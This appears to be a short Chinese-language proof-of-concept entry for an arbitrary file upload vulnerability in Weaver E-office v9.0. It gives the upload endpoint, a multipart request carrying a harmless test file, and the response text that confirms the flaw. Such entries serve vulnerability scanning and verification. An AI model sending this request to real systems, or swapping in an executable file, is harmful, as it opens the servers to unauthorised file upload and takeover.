# 泛微E-officev9.0任意文件上传漏洞

泛微OA ｜ 文件上传 ｜ —
- **请求**：`POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1`

**Payload**
```
--cd3e4e75b997661a11274a2267484e1d
Content-Disposition: form-data; name="Filedata"; filename="abc.txt"
hiword123
--cd3e4e75b997661a11274a2267484e1d--
```
- **响应特征**：-1 logo-eoffice.txt